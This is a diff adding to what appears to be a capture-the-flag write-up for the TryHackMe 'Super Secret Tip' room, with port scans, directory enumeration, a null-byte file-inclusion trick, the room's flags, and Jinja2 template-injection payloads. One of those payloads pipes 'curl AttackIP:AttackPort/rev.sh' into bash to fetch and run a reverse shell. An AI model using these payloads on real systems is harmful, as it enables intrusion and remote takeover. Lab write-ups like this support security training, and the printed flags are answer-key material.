@@ -4,7 +4,99 @@
 
 <p>https://tryhackme.com/room/supersecrettip</p>
 
+```bash
+:~/SuperSecretTip# sudo nmap -p- --min-rate 5000 -Pn 10.10.44.2
+...
+Host is up (0.00032s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+7777/tcp open  cbt
+
+:~/SuperSecretTip# sudo nmap -sC -sV -A -Pn -p 22,7777 TargetIP
+...
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+...
+7777/tcp open  cbt?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Server: Werkzeug/2.3.4 Python/3.11.0
+|     Date: Thu, 10 Jul 2025 22:31:35 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 5688
+|     Connection: close
+|     <!DOCTYPE html>
+|     <html lang="en">
+|     <head>
+|     <meta charset="utf-8">
+|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
+|     <meta name="viewport" content="width=device-width, initial-scale=1">
+|     <meta name="description" content="SSTI is wonderful">
+|     <meta name="author" content="Ayham Al-Ali">
+|     <link rel="icon" href="favicon.ico">
+|     <title>Super Secret TIp</title>
+|     <!-- Bootstrap core CSS -->
+|     <link href="/static/css/bootstrap.min.css" rel="stylesheet">
+|     <!-- Custom styles for this template -->
+|     <link href="/static/css/carousel.css" rel="stylesheet">
+|     </head>
+|     <!-- NAVBAR
+|     ================================================== -->
+|     <body>
+|     <div class="navbar-wrapper">
+|     <div class=
+|   Socks5: 
+|     <!DOCTYPE HTML>
+|     <html lang="en">
+|     <head>
+|     <meta charset="utf-8">
+|     <title>Error response</title>
+|     </head>
+|     <body>
+|     <h1>Error response</h1>
+|     <p>Error code: 400</p>
+|     <p>Message: Bad request syntax ('
+|     ').</p>
+|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
+|     </body>
+|_    </html>
+```
+
+```bash
+:~/SuperSecretTip# gobuster dir -u http://10.10.44.2:7777 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 80
+...
+/cloud                (Status: 200) [Size: 2991]
+/debug                (Status: 200) [Size: 1957]
+```
+
+```bash
+:~/SuperSecretTip# gobuster dir -u http://10.10.44.2:7777 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 80
+...
+/cloud                (Status: 200) [Size: 2991]
+```
+
+<img width="800" height="512" alt="image" src="https://github.com/user-attachments/assets/e06d4ead-8cbf-4dbd-bdcc-dda787c47ec4" />
+
+
+<img width="1517" height="401" alt="image" src="https://github.com/user-attachments/assets/a6e06f9f-6392-423d-ad74-e691114e7bc7" />
+
+
+<img width="800" height="275" alt="image" src="https://github.com/user-attachments/assets/91aa801c-2dc8-4592-a86d-5c57397bba6e" />
+
+
+<img width="1516" height="310" alt="image" src="https://github.com/user-attachments/assets/fa962e3c-191c-48d5-941b-def5602a5f4e" />
+
+
+<img width="1896" height="286" alt="image" src="https://github.com/user-attachments/assets/cecdb360-a835-4d78-b8fa-df1babd816b0" />
+
+
 <h2>Task 1 . Exploit the machine</h2>
+
+<img width="1524" height="34" alt="image" src="https://github.com/user-attachments/assets/c55a698a-5143-4054-b95d-6a2335bf7549" />
+
 
 
 
@@ -126,6 +218,8 @@ if __name__ == "__main__":
 b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
 ```
 
+curl http://10.10.73.25:7777/cloud -X POST -d "download=supersecrettip.txt"
+
 <p>debugpassword.py%00.txt = debugpassword.py<br>
 .txt is ignored after the NULL BYTE `%00</p>
 
@@ -157,11 +251,37 @@ b' \x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
 
 {{namespace.__init__.__globals__.os.popen("id").read()}}
 
+<p>{{+self.__init__.__globals__.__builtins__.__import__("os").popen("curl+AttackIP:AttackPort/rev.sh+|+bash").read()+}}
+ : ayhamDeebugg</p>
 
-{{namespace.__init__.__globals__.os.popen("id").read()}}
+
+THM{LFI_1s_Pr33Ty_Aw3s0Me_1337}<br>
+
+110920001386<br>
 
 
+THM{cronjobs_F1Le_iNPu7_cURL_4re_5c4ry_Wh3N_C0mb1n3d_t0g3THeR}<br>
 
 
 
 <h2>Task 2 . Thank you!</h2>
+
+<br>
+
+<img width="1898" height="887" alt="image" src="https://github.com/user-attachments/assets/429591c0-70fc-4839-a881-b7fc6929f25c" />
+
+
+<img width="1892" height="877" alt="image" src="https://github.com/user-attachments/assets/08344e1f-39cf-4ea3-99f1-f285ee889aec" />
+
+<img width="324" height="218" alt="image" src="https://github.com/user-attachments/assets/49a8aa4f-ef42-4986-a2a4-209f14209830" />
+
+
+<img width="1894" height="896" alt="image" src="https://github.com/user-attachments/assets/f68b54b7-e851-4907-b203-29fd41b62377" />
+
+<img width="1894" height="889" alt="image" src="https://github.com/user-attachments/assets/059ebae3-2c42-4c8a-9a55-f9fb22e70dc4" />
+
+
+<img width="1886" height="890" alt="image" src="https://github.com/user-attachments/assets/5e3337c5-f3f6-4c7f-a05f-1265b4cb5fa4" />
+
+
+
